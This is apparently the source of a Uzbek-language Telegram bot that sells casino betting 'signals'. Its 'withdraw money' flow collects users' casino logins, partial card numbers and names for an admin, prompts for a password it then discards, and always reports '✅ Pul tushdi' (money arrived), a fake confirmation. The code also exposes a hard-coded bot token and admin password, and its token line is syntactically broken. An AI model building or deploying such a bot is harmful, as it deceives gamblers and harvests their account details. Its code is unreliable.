# telegram-bot
Telegram bot 24/7
import telebot
import os
from telebot import types

# ================= SOZLAMALAR =================
TOKEN = os.getenv("8527838740:"8527838740:"AAHGt98whc83Ybg2pf2bE3q27QxMl48wXv4")
ADMIN_PASSWORD = "7442627R"
ADMIN_ID = None  # birinchi kirgan admin ID bo‘ladi
# =============================================

bot = telebot.TeleBot(TOKEN)

live_signal = "Signal yo‘q"
expert_signal = "Signal yo‘q"

user_step = {}
user_data = {}

# ================= START =================
@bot.message_handler(commands=['start'])
def start(m):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("LIVE", "EXPERT")
    kb.add("Pul chiqarish", "ADMIN")
    bot.send_message(
        m.chat.id,
        "Salom 👋\nXush kelibsiz!",
        reply_markup=kb
    )

# ================= LIVE =================
@bot.message_handler(func=lambda m: m.text == "LIVE")
def live(m):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Signal olish", "Orqaga")
    bot.send_message(m.chat.id, "LIVE bo‘limiga xush kelibsiz", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "Signal olish")
def live_get(m):
    bot.send_message(m.chat.id, live_signal)

# ================= EXPERT =================
@bot.message_handler(func=lambda m: m.text == "EXPERT")
def expert(m):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Signal olish", "Orqaga")
    bot.send_message(m.chat.id, "EXPERT bo‘limiga xush kelibsiz", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "Orqaga")
def back(m):
    start(m)

# ================= PUL CHIQARISH =================
@bot.message_handler(func=lambda m: m.text == "Pul chiqarish")
def withdraw(m):
    user_data[m.chat.id] = {}
    user_step[m.chat.id] = "casino"
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("1XBET", "MOSTBET", "PIN-UP")
    bot.send_message(m.chat.id, "Kazino tanlang:", reply_markup=kb)

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "casino")
def get_casino(m):
    user_data[m.chat.id]["casino"] = m.text
    user_step[m.chat.id] = "login"
    bot.send_message(m.chat.id, "ID yoki loginni kiriting:")

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "login")
def get_login(m):
    user_data[m.chat.id]["login"] = m.text
    user_step[m.chat.id] = "password"
    bot.send_message(m.chat.id, "Parolni kiriting:")

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "password")
def get_password(m):
    user_data[m.chat.id]["password"] = "****"
    user_step[m.chat.id] = "cardtype"
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("HUMO", "UZCARD", "VISA")
    bot.send_message(m.chat.id, "Karta turini tanlang:", reply_markup=kb)

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "cardtype")
def get_cardtype(m):
    user_data[m.chat.id]["cardtype"] = m.text
    user_step[m.chat.id] = "cardnum"
    bot.send_message(m.chat.id, "Karta raqamini kiriting:")

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "cardnum")
def get_cardnum(m):
    num = m.text
    masked = num[:4] + " **** **** " + num[-4:]
    user_data[m.chat.id]["cardnum"] = masked
    user_step[m.chat.id] = "name"
    bot.send_message(m.chat.id, "Ismingizni kiriting:")

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "name")
def get_name(m):
    user_data[m.chat.id]["name"] = m.text
    user_step[m.chat.id] = "surname"
    bot.send_message(m.chat.id, "Familiyangizni kiriting:")

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "surname")
def get_surname(m):
    user_data[m.chat.id]["surname"] = m.text
    user_step[m.chat.id] = None

    text = f"""💳 PUL CHIQARISH SO‘ROVI

KAZINO: {user_data[m.chat.id]['casino']}
LOGIN: {user_data[m.chat.id]['login']}
PAROL: ****
ISM: {user_data[m.chat.id]['name']}
FAMILIYA: {user_data[m.chat.id]['surname']}
KARTA: {user_data[m.chat.id]['cardtype']}
KARTA RAQAM: {user_data[m.chat.id]['cardnum']}
"""

    if ADMIN_ID:
        bot.send_message(ADMIN_ID, text)

    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("TASHADIM", "Orqaga")
    bot.send_message(m.chat.id, "So‘rov yuborildi. Kuting.", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "TASHADIM")
def done(m):
    bot.send_message(m.chat.id, "✅ Pul tushdi\nXizmatingiz uchun rahmat")
    start(m)

# ================= ADMIN =================
@bot.message_handler(func=lambda m: m.text == "ADMIN")
def admin(m):
    user_step[m.chat.id] = "admin_pass"
    bot.send_message(m.chat.id, "Admin parolni kiriting:")

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "admin_pass")
def admin_pass(m):
    global ADMIN_ID
    if m.text == ADMIN_PASSWORD:
        ADMIN_ID = m.chat.id
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.add("LIVE signal", "EXPERT signal")
        kb.add("Reklama", "Orqaga")
        bot.send_message(m.chat.id, "Admin panel", reply_markup=kb)
        user_step[m.chat.id] = None
    else:
        bot.send_message(m.chat.id, "❌ Parol noto‘g‘ri")

@bot.message_handler(func=lambda m: m.text == "LIVE signal")
def set_live(m):
    user_step[m.chat.id] = "set_live"
    bot.send_message(m.chat.id, "32KF/code:XXXX formatda yuboring")

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "set_live")
def save_live(m):
    global live_signal
    if m.text.startswith("32KF/code:"):
        live_signal = m.text
        bot.send_message(m.chat.id, "LIVE signal saqlandi ✅")
        user_step[m.chat.id] = None
    else:
        bot.send_message(m.chat.id, "Format xato ❌")

@bot.message_handler(func=lambda m: m.text == "EXPERT signal")
def set_expert(m):
    user_step[m.chat.id] = "set_expert"
    bot.send_message(m.chat.id, "32KF/code:XXXX formatda yuboring")

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "set_expert")
def save_expert(m):
    global expert_signal
    if m.text.startswith("32KF/code:"):
        expert_signal = m.text
        bot.send_message(m.chat.id, "EXPERT signal saqlandi ✅")
        user_step[m.chat.id] = None
    else:
        bot.send_message(m.chat.id, "Format xato ❌")

@bot.message_handler(func=lambda m: m.text == "Reklama")
def reklama(m):
    user_step[m.chat.id] = "ads"
    bot.send_message(m.chat.id, "Reklama matnini yuboring:")

@bot.message_handler(func=lambda m: user_step.get(m.chat.id) == "ads")
def send_ads(m):
    bot.send_message(m.chat.id, "📢 Reklama yuborildi")
    user_step[m.chat.id] = None

# ================= RUN =================
bot.infinity_polling()
